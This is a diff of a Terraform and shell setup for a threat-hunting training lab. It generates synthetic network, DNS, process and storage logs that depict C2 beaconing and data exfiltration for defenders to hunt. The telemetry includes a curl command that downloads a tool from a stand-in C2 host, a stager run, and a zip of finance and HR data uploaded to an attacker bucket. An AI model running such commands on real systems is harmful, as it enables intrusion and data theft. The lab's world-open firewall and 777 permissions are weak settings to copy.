@@ -1,6 +1,16 @@
-# --- Dynamic lab credentials (Terraform-generated) ---
+# ============================================================================
+# Threat Hunting Lab 2 — Beacon and Exfiltration Hunt
+# Terraform: 1x GCE VM running Elasticsearch + Kibana (via Docker) + Nginx Basic Auth
+# Datasets generated (last 72h):
+#   - network-flow-*          (beaconing + large exfil transfer + noise)
+#   - dns-logs-*              (c2-example.com + subdomains + noise)
+#   - workload-telemetry-*    (curl/wget/python/tar/zip + archive creation + noise)
+#   - cloud-storage-audit-*   (storage.objects.insert for archive + noise)
+# Also creates Kibana Data Views automatically.
+# ============================================================================
+
 resource "random_id" "lab_user_suffix" {
-  byte_length = 3 # 6 hex chars
+  byte_length = 3
 }
 
 locals {
@@ -23,15 +33,15 @@ resource "google_compute_firewall" "allow_http" {
   }
 
   source_ranges = ["0.0.0.0/0"]
-  target_tags   = ["thl-iam-lab"]
+  target_tags   = ["thl-beacon-lab"]
 }
 
-resource "google_compute_instance" "thl_iam_lab" {
-  name         = "thl-iam-lab"
+resource "google_compute_instance" "thl_beacon_lab" {
+  name         = "thl-beacon-lab"
   project      = var.gcp_project_id
   machine_type = "e2-standard-4"
   zone         = var.gcp_zone
-  tags         = ["thl-iam-lab"]
+  tags         = ["thl-beacon-lab"]
 
   boot_disk {
     initialize_params {
@@ -108,9 +118,9 @@ chmod +x /usr/local/bin/docker-compose
 /usr/local/bin/docker-compose version || true
 
 echo "[+] Preparing /opt/lab"
-rm -rf /opt/lab/{nginx,dataset,bulk,scripts} || true
-mkdir -p /opt/lab/{nginx,dataset,bulk,scripts}
-chmod -R 777 /opt/lab/dataset
+rm -rf /opt/lab/{nginx,bulk,scripts} || true
+mkdir -p /opt/lab/{nginx,bulk,scripts}
+chmod -R 777 /opt/lab/bulk
 cd /opt/lab
 
 echo "[+] Creating htpasswd file"
@@ -182,12 +192,12 @@ docker-compose up -d
 docker ps
 
 ###############################################################################
-# Step 3 — SOC-real dataset generator (dynamic timestamps + lots of events)
+# Step — Generate Lab 2 datasets (last 72h) + BULK NDJSON
 ###############################################################################
-echo "[+] Generating SOC-real datasets (last 72h) and BULK NDJSON"
+echo "[+] Generating Lab 2 datasets (last 72h) and BULK NDJSON"
 
 tee /opt/lab/scripts/generate_bulk.py >/dev/null <<'PY'
-import json, random
+import json, random, string
 from datetime import datetime, timedelta, timezone
 from pathlib import Path
 
@@ -212,30 +222,30 @@ def write_bulk(path: Path, records):
             f.write(json.dumps(doc) + "\n")
 
 def rand_dt():
-    # random timestamp in [START, NOW]
     delta = NOW - START
     return START + timedelta(seconds=random.randint(0, int(delta.total_seconds())))
 
-# ---- Entities (real SOC-like) ----
+# -----------------------------
+# Entities / look & feel
+# -----------------------------
+HOSTS = ["GCE-WEB-01", "GCE-APP-02", "GCE-DB-01", "K8S-NODE-01", "K8S-NODE-02"]
+COMPROMISED_HOST = "GCE-APP-02"
+SRC_PRIVATE_IPS = ["10.10.2.11", "10.10.2.12", "10.10.2.21", "10.10.3.31", "10.10.3.41"]
+SRC_PRIVATE_IP_COMP = "10.10.2.21"
+
 USERS = [
-    {"email":"alice@corp.com","dept":"Finance","role":"user"},
-    {"email":"bob@corp.com","dept":"IT","role":"poweruser"},
-    {"email":"charles@corp.com","dept":"HR","role":"user"},
-    {"email":"diane@corp.com","dept":"Sales","role":"user"},
-    {"email":"eve@corp.com","dept":"Security","role":"admin"},
+    {"email":"svc-app@corp.com","role":"service_account"},
+    {"email":"svc-backup@corp.com","role":"service_account"},
+    {"email":"alice@corp.com","role":"user"},
+    {"email":"bob@corp.com","role":"poweruser"},
+    {"email":"eve@corp.com","role":"admin"},
 ]
-SERVICE_ACCTS = [
-    {"account":"backup-sa@corp.com"},
-    {"account":"ci-cd-sa@corp.com"},
-    {"account":"reporting-sa@corp.com"},
-]
-HOSTS = ["WKSTN-019","WKSTN-044","WKSTN-101","SRV-APP-02","SRV-FILES-01"]
-USER_AGENTS = [
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_6)",
-    "Mozilla/5.0 (X11; Linux x86_64)",
-    "curl/8.5.0",
-]
+
+# External infra
+C2_DOMAIN = "c2-example.com"
+C2_IPS = ["203.0.113.77", "198.51.100.23"]
+CLOUD_STORAGE_IPS = ["34.120.10.10", "34.95.20.20"]  # looks like public cloud ranges
+
 IPS_CA = ["24.48.123.11","99.230.11.7","142.112.88.9","70.50.146.28","34.95.10.22"]
 IPS_WORLD = ["51.158.91.22","91.198.174.192","101.89.33.17","185.220.101.1","3.221.14.9"]
 GEO = {
@@ -255,176 +265,249 @@ def geo(ip):
     c, city = GEO.get(ip, ("Unknown","Unknown"))
     return {"country_name": c, "city_name": city}
 
-# ---- AUTH logs (noise + signals) ----
-auth_records = []
+def rand_ua():
+    return random.choice([
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_6)",
+        "Mozilla/5.0 (X11; Linux x86_64)",
+        "curl/8.5.0",
+    ])
 
-# Normal login noise
-for _ in range(900):
+def high_entropy_label(n=12):
+    alphabet = string.ascii_lowercase + string.digits
+    return "".join(random.choice(alphabet) for _ in range(n))
+
+# -----------------------------
+# NETWORK FLOW LOGS
+# Fields aligned to your lab queries:
+#   network.direction, bytes_out, destination.ip, destination.domain, @timestamp
+# -----------------------------
+net_records = []
+
+# Noise: normal outbound traffic (mix small + medium) from multiple hosts
+for _ in range(1400):
     dt = rand_dt()
-    u = random.choice(USERS)
-    ip = random.choice(IPS_CA)
+    host = random.choice(HOSTS)
+    src_priv = random.choice(SRC_PRIVATE_IPS)
+    dst_ip = random.choice(CLOUD_STORAGE_IPS + C2_IPS + IPS_CA + IPS_WORLD)
+    dst_domain = random.choice([
+        "update.ubuntu.com",
+        "packages.elastic.co",
+        "api.github.com",
+        "storage.googleapis.com",
+        "login.microsoftonline.com",
+        "cdn.cloudflare.com",
+    ])
+    bytes_out = random.randint(200, 200000)
     doc = {
         "@timestamp": iso(dt),
-        "event": {"dataset":"auth", "action":"user_login", "outcome":"success"},
-        "user": {"email": u["email"], "department": u["dept"], "role": u["role"]},
-        "source": {"ip": ip},
-        "geo": geo(ip),
-        "user_agent": {"original": random.choice(USER_AGENTS)},
-        "device": {"name": random.choice(HOSTS)},
-        "auth": {"method": random.choice(["password","mfa_push","webauthn"])}
+        "event": {"dataset":"network_flow", "action":"flow", "outcome":"success"},
+        "network": {"direction":"outbound", "transport": random.choice(["tcp","udp"]), "protocol":"ip"},
+        "source": {"ip": src_priv},
+        "destination": {"ip": dst_ip, "domain": dst_domain, "port": random.choice([53,80,443,8080,8443])},
+        "bytes_out": bytes_out,
+        "bytes_in": random.randint(200, 50000),
+        "device": {"name": host},
     }
-    auth_records.append((index_name("auth-logs", dt), doc))
+    net_records.append((index_name("network-flow", dt), doc))
 
-# Brute force pattern on one user (failures then success)
-victim = "diane@corp.com"
-attack_ip = random.choice(IPS_WORLD)
-base = NOW - timedelta(hours=6)
-for i in range(25):
-    dt = base + timedelta(minutes=i*2)
-    outcome = "failure" if i < 24 else "success"
+# Signal 1: C2 beaconing — periodic, low-volume, stable dst domain
+# Every 5 minutes for ~8 hours with slight jitter; bytes_out < 5000
+beacon_start = NOW - timedelta(hours=18)
+beacon_end = NOW - timedelta(hours=10)
+t = beacon_start
+while t <= beacon_end:
+    jitter = random.randint(-20, 20)  # seconds
+    dt = t + timedelta(seconds=jitter)
+    dst_ip = random.choice(C2_IPS)
     doc = {
         "@timestamp": iso(dt),
-        "event": {"dataset":"auth", "action":"user_login", "outcome": outcome},
-        "user": {"email": victim, "department": "Sales", "role":"user"},
-        "source": {"ip": attack_ip},
-        "geo": geo(attack_ip),
-        "user_agent": {"original": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"},
-        "device": {"name": "VPN-GW-01"},
-        "auth": {"method": "password"},
-        "related": {"ip":[attack_ip]},
-        "rule": {"name":"suspected_bruteforce_sequence"}
+        "event": {"dataset":"network_flow", "action":"flow", "outcome":"success"},
+        "network": {"direction":"outbound", "transport":"tcp", "protocol":"ip"},
+        "source": {"ip": SRC_PRIVATE_IP_COMP},
+        "destination": {"ip": dst_ip, "domain": C2_DOMAIN, "port": 443},
+        "bytes_out": random.randint(600, 2800),   # low-volume
+        "bytes_in": random.randint(400, 2200),
+        "device": {"name": COMPROMISED_HOST},
+        "rule": {"name":"c2_beacon_candidate"},
     }
-    auth_records.append((index_name("auth-logs", dt), doc))
+    net_records.append((index_name("network-flow", dt), doc))
+    t += timedelta(minutes=5)
 
-# Impossible travel for bob (CA -> RU -> CN within short window)
-bob = "bob@corp.com"
-dt1 = NOW - timedelta(hours=2, minutes=20)
-dt2 = NOW - timedelta(hours=2, minutes=5)
-dt3 = NOW - timedelta(hours=1, minutes=50)
-for dt, ip in [(dt1, "99.230.11.7"), (dt2, "91.198.174.192"), (dt3, "101.89.33.17")]:
-    doc = {
-        "@timestamp": iso(dt),
-        "event": {"dataset":"auth", "action":"user_login", "outcome":"success"},
-        "user": {"email": bob, "department":"IT", "role":"poweruser"},
-        "source": {"ip": ip},
-        "geo": geo(ip),
-        "user_agent": {"original": random.choice(USER_AGENTS)},
-        "device": {"name": "WKSTN-044"},
-        "auth": {"method": random.choice(["password","mfa_push"])},
-        "rule": {"name":"impossible_travel_candidate"}
-    }
-    auth_records.append((index_name("auth-logs", dt), doc))
-
-# ---- AUDIT logs (IAM policy changes) ----
-audit_records = []
-admin = "eve@corp.com"
-
-# Normal admin changes
-for _ in range(250):
-    dt = rand_dt()
-    role = random.choice(["roles/viewer","roles/logging.viewer","roles/compute.viewer","roles/storage.objectViewer"])
-    change = random.choice(["add","remove"])
-    actor = random.choice([admin,"admin2@corp.com"])
-    doc = {
-        "@timestamp": iso(dt),
-        "event": {"dataset":"audit", "action":"setIamPolicy", "outcome":"success"},
-        "actor": {"email": actor},
-        "iam": {"role": role, "change": change},
-        "resource": {"type":"gcp_project", "name":"corp-prod"},
-        "source": {"ip": random.choice(IPS_CA)},
-        "geo": geo(random.choice(IPS_CA)),
-    }
-    audit_records.append((index_name("audit-logs", dt), doc))
-
-# Privilege escalation (owner granted) by bob from foreign IP
-dt_pe = NOW - timedelta(hours=1, minutes=15)
-doc_pe = {
-    "@timestamp": iso(dt_pe),
-    "event": {"dataset":"audit", "action":"setIamPolicy", "outcome":"success"},
-    "actor": {"email": bob},
-    "iam": {"role": "roles/owner", "change":"add"},
-    "resource": {"type":"gcp_project", "name":"corp-prod"},
-    "source": {"ip": "91.198.174.192"},
-    "geo": geo("91.198.174.192"),
-    "rule": {"name":"privilege_escalation_owner_grant"}
+# Signal 2: Large outbound transfer (exfil) — bytes_out > 5,000,000
+# Happens shortly after archive creation (we'll align in workload telemetry)
+exfil_dt = NOW - timedelta(hours=9, minutes=42)
+exfil_dst_ip = random.choice(CLOUD_STORAGE_IPS)
+doc_exfil = {
+    "@timestamp": iso(exfil_dt),
+    "event": {"dataset":"network_flow", "action":"flow", "outcome":"success"},
+    "network": {"direction":"outbound", "transport":"tcp", "protocol":"ip"},
+    "source": {"ip": SRC_PRIVATE_IP_COMP},
+    "destination": {"ip": exfil_dst_ip, "domain": "storage.googleapis.com", "port": 443},
+    "bytes_out": random.randint(6_500_000, 18_000_000),
+    "bytes_in": random.randint(50_000, 200_000),
+    "device": {"name": COMPROMISED_HOST},
+    "rule": {"name":"suspected_exfil_large_transfer"},
 }
-audit_records.append((index_name("audit-logs", dt_pe), doc_pe))
+net_records.append((index_name("network-flow", exfil_dt), doc_exfil))
 
-# ---- SERVICE ACCOUNT events (key creation) ----
-sa_records = []
-# Normal key rotations
-for _ in range(120):
-    dt = rand_dt()
-    sa = random.choice(SERVICE_ACCTS)["account"]
-    actor = random.choice([admin,"admin2@corp.com"])
-    key_id = f"key-{random.randint(10000,99999)}"
-    doc = {
-        "@timestamp": iso(dt),
-        "event": {"dataset":"service_account", "action":"createServiceAccountKey", "outcome":"success"},
-        "service": {"account": sa, "key_id": key_id},
-        "actor": {"email": actor},
-        "source": {"ip": random.choice(IPS_CA)},
-        "geo": geo(random.choice(IPS_CA)),
-    }
-    sa_records.append((index_name("service-accounts", dt), doc))
+# -----------------------------
+# DNS LOGS
+# Fields aligned to your lab queries:
+#   dns.question.name, source.ip, @timestamp, geo.country_name
+# -----------------------------
+dns_records = []
 
-# Suspicious key creation for backup-sa by bob from RU IP
-dt_sa = NOW - timedelta(hours=1, minutes=5)
-doc_sa = {
-    "@timestamp": iso(dt_sa),
-    "event": {"dataset":"service_account", "action":"createServiceAccountKey", "outcome":"success"},
-    "service": {"account":"backup-sa@corp.com", "key_id":"key-99999"},
-    "actor": {"email": bob},
-    "source": {"ip":"91.198.174.192"},
-    "geo": geo("91.198.174.192"),
-    "rule": {"name":"suspicious_sa_key_creation"}
-}
-sa_records.append((index_name("service-accounts", dt_sa), doc_sa))
-
-# ---- IAM activity / data access / exfil-like events ----
-iam_records = []
-
-# Normal access noise
-for _ in range(220):
-    dt = rand_dt()
-    sa = random.choice(SERVICE_ACCTS)["account"]
-    action = random.choice(["token_generate","data_access","data_list"])
-    res = random.choice(["corp-logs-bucket","corp-app-bucket","corp-reports-bucket"])
-    doc = {
-        "@timestamp": iso(dt),
-        "event": {"dataset":"iam_activity", "action": action, "outcome":"success"},
-        "service": {"account": sa},
-        "resource": {"type":"cloud_storage", "name": res},
-        "source": {"ip": random.choice(IPS_CA)},
-        "geo": geo(random.choice(IPS_CA)),
-    }
-    iam_records.append((index_name("iam-activity", dt), doc))
-
-# Exfil chain using compromised key-99999 from RU IP
-chain = [
-    (NOW - timedelta(hours=1, minutes=0),  "token_generate", "corp-finance-bucket"),
-    (NOW - timedelta(minutes=50),          "data_access",    "corp-finance-bucket"),
-    (NOW - timedelta(minutes=40),          "data_list",      "corp-hr-bucket"),
-    (NOW - timedelta(minutes=30),          "data_download",  "corp-hr-bucket"),
-    (NOW - timedelta(minutes=25),          "data_download",  "corp-hr-bucket"),
+# Noise: common DNS queries
+COMMON_DOMAINS = [
+    "google.com", "gstatic.com", "github.com", "microsoft.com",
+    "ubuntu.com", "elastic.co", "cloudflare.com", "example.org"
 ]
-for dt, action, bucket in chain:
+for _ in range(1200):
+    dt = rand_dt()
+    src_ip = random.choice(SRC_PRIVATE_IPS)
+    qname = random.choice(COMMON_DOMAINS + [f"api.{d}" for d in COMMON_DOMAINS])
     doc = {
         "@timestamp": iso(dt),
-        "event": {"dataset":"iam_activity", "action": action, "outcome":"success"},
-        "service": {"account":"backup-sa@corp.com", "key_id":"key-99999"},
-        "resource": {"type":"cloud_storage", "name": bucket},
-        "source": {"ip":"91.198.174.192"},
-        "geo": geo("91.198.174.192"),
-        "rule": {"name":"suspected_exfil_via_sa_key"}
+        "event": {"dataset":"dns", "action":"query", "outcome":"success"},
+        "dns": {"question": {"name": qname, "type": random.choice(["A","AAAA","CNAME"])}},
+        "source": {"ip": src_ip},
+        "geo": geo(random.choice(IPS_CA)),  # internal DNS: keep geo "Canada-like"
+        "device": {"name": random.choice(HOSTS)},
     }
-    iam_records.append((index_name("iam-activity", dt), doc))
+    dns_records.append((index_name("dns-logs", dt), doc))
 
-# ---- Write BULK files ----
-write_bulk(OUT_DIR / "auth.bulk.ndjson", auth_records)
-write_bulk(OUT_DIR / "audit.bulk.ndjson", audit_records)
-write_bulk(OUT_DIR / "service-accounts.bulk.ndjson", sa_records)
-write_bulk(OUT_DIR / "iam-activity.bulk.ndjson", iam_records)
+# Signal: repeated DNS to c2-example.com + subdomains aligned with beacon window
+t = beacon_start - timedelta(minutes=10)
+while t <= beacon_end + timedelta(minutes=10):
+    dt = t + timedelta(seconds=random.randint(-15, 15))
+    # mix root domain + subdomains (some high entropy)
+    if random.random() < 0.35:
+        qname = C2_DOMAIN
+    else:
+        label = high_entropy_label(10) if random.random() < 0.6 else random.choice(["cdn","img","api","status","telemetry"])
+        qname = f"{label}.{C2_DOMAIN}"
+    doc = {
+        "@timestamp": iso(dt),
+        "event": {"dataset":"dns", "action":"query", "outcome":"success"},
+        "dns": {"question": {"name": qname, "type":"A"}},
+        "source": {"ip": SRC_PRIVATE_IP_COMP},
+        "geo": geo("34.95.10.22"),  # Canada-like
+        "device": {"name": COMPROMISED_HOST},
+        "rule": {"name":"dns_c2_domain_candidate"},
+    }
+    dns_records.append((index_name("dns-logs", dt), doc))
+    t += timedelta(minutes=3)
+
+# -----------------------------
+# WORKLOAD TELEMETRY (process)
+# Fields aligned to your lab queries:
+#   process.name, (optional) process.command_line, file.name, @timestamp
+# -----------------------------
+workload_records = []
+
+# Noise: routine processes
+NOISE_PROCS = ["systemd", "sshd", "cron", "dockerd", "kubelet", "nginx", "java", "python", "bash"]
+for _ in range(1100):
+    dt = rand_dt()
+    host = random.choice(HOSTS)
+    proc = random.choice(NOISE_PROCS)
+    doc = {
+        "@timestamp": iso(dt),
+        "event": {"dataset":"workload", "action":"process_start", "outcome":"success"},
+        "process": {"name": proc, "pid": random.randint(100, 50000)},
+        "user": {"name": random.choice(["root","ubuntu","app","elastic","www-data"])},
+        "device": {"name": host},
+    }
+    workload_records.append((index_name("workload-telemetry", dt), doc))
+
+# Signal: tool usage + staging on compromised host (curl/wget/python/tar/zip)
+staging_start = NOW - timedelta(hours=10, minutes=5)
+
+# 1) tool download
+dt_tool = staging_start
+doc_tool = {
+    "@timestamp": iso(dt_tool),
+    "event": {"dataset":"workload", "action":"process_start", "outcome":"success"},
+    "process": {"name":"curl", "command_line": "curl -sS https://c2-example.com/tools/agent.bin -o /tmp/agent.bin"},
+    "user": {"name":"ubuntu"},
+    "device": {"name": COMPROMISED_HOST},
+    "rule": {"name":"suspicious_tool_download"},
+}
+workload_records.append((index_name("workload-telemetry", dt_tool), doc_tool))
+
+# 2) python execution (stager)
+dt_py = staging_start + timedelta(minutes=7)
+doc_py = {
+    "@timestamp": iso(dt_py),
+    "event": {"dataset":"workload", "action":"process_start", "outcome":"success"},
+    "process": {"name":"python", "command_line": "python3 /tmp/stage.py --collect /srv/data --out /tmp/stage"},
+    "user": {"name":"ubuntu"},
+    "device": {"name": COMPROMISED_HOST},
+    "rule": {"name":"suspicious_stager_execution"},
+}
+workload_records.append((index_name("workload-telemetry", dt_py), doc_py))
+
+# 3) archive creation (zip or tar) — align just before large transfer
+ARCHIVE_NAME = "finance-exports-2026-02-archive.zip"
+dt_zip = exfil_dt - timedelta(minutes=6)  # archive shortly before large outbound transfer
+doc_zip = {
+    "@timestamp": iso(dt_zip),
+    "event": {"dataset":"workload", "action":"process_start", "outcome":"success"},
+    "process": {"name":"zip", "command_line": f"zip -r /tmp/{ARCHIVE_NAME} /srv/data/finance /srv/data/hr"},
+    "file": {"name": f"/tmp/{ARCHIVE_NAME}", "extension":"zip"},
+    "user": {"name":"ubuntu"},
+    "device": {"name": COMPROMISED_HOST},
+    "rule": {"name":"data_staging_archive_creation"},
+}
+workload_records.append((index_name("workload-telemetry", dt_zip), doc_zip))
+
+# -----------------------------
+# CLOUD STORAGE AUDIT LOGS
+# Fields aligned to your lab queries:
+#   event.action:"storage.objects.insert", object.name, actor.email, @timestamp
+# -----------------------------
+cs_records = []
+
+# Noise: storage reads/list
+for _ in range(450):
+    dt = rand_dt()
+    actor = random.choice(USERS)["email"]
+    action = random.choice(["storage.objects.get","storage.objects.list","storage.buckets.get"])
+    doc = {
+        "@timestamp": iso(dt),
+        "event": {"dataset":"cloud_storage_audit", "action": action, "outcome":"success"},
+        "actor": {"email": actor},
+        "bucket": {"name": random.choice(["corp-logs-bucket","corp-app-bucket","corp-backups-bucket"])},
+        "object": {"name": random.choice(["logs/2026/02/24.log","app/config.yaml","backups/db.bak"])},
+        "source": {"ip": random.choice(IPS_CA)},
+        "geo": geo(random.choice(IPS_CA)),
+    }
+    cs_records.append((index_name("cloud-storage-audit", dt), doc))
+
+# Signal: exfil upload via storage.objects.insert
+# Align shortly after large outbound transfer
+upload_dt = exfil_dt + timedelta(minutes=2)
+doc_upload = {
+    "@timestamp": iso(upload_dt),
+    "event": {"dataset":"cloud_storage_audit", "action":"storage.objects.insert", "outcome":"success"},
+    "actor": {"email":"svc-app@corp.com"},
+    "bucket": {"name":"attacker-exfil-bucket"},
+    "object": {"name": f"exfil/{ARCHIVE_NAME}"},
+    "source": {"ip":"3.221.14.9"},
+    "geo": geo("3.221.14.9"),
+    "device": {"name": COMPROMISED_HOST},
+    "rule": {"name":"confirmed_exfil_to_cloud_storage"},
+}
+cs_records.append((index_name("cloud-storage-audit", upload_dt), doc_upload))
+
+# -----------------------------
+# Write BULK files
+# -----------------------------
+write_bulk(OUT_DIR / "network-flow.bulk.ndjson", net_records)
+write_bulk(OUT_DIR / "dns-logs.bulk.ndjson", dns_records)
+write_bulk(OUT_DIR / "workload-telemetry.bulk.ndjson", workload_records)
+write_bulk(OUT_DIR / "cloud-storage-audit.bulk.ndjson", cs_records)
 
 print("BULK generated:")
 for p in sorted(OUT_DIR.glob("*.ndjson")):
@@ -470,7 +553,7 @@ echo "[+] Verifying indices"
 docker exec -i "$ES_CID" curl -s "http://localhost:9200/_cat/indices?v" || true
 
 ###############################################################################
-# Step 4 — Create Kibana Data Views via API (through Nginx + Basic Auth)
+# Create Kibana Data Views via API (through Nginx + Basic Auth)
 ###############################################################################
 echo "[+] Waiting for Kibana API through Nginx (http://localhost/api/status)"
 for i in {1..300}; do
@@ -511,10 +594,11 @@ create_data_view() {
   return 1
 }
 
-create_data_view "auth-logs" "auth-logs-*"
-create_data_view "audit-logs" "audit-logs-*"
-create_data_view "service-accounts" "service-accounts-*"
-create_data_view "iam-activity" "iam-activity-*"
+# Data views required by Lab 2
+create_data_view "network-flow" "network-flow-*"
+create_data_view "dns-logs" "dns-logs-*"
+create_data_view "workload-telemetry" "workload-telemetry-*"
+create_data_view "cloud-storage-audit" "cloud-storage-audit-*"
 
 echo "[+] Listing data views (name -> pattern)"
 curl -s -u "$LAB_USER:$LAB_PASS" -H "kbn-xsrf: true" http://localhost/api/data_views \
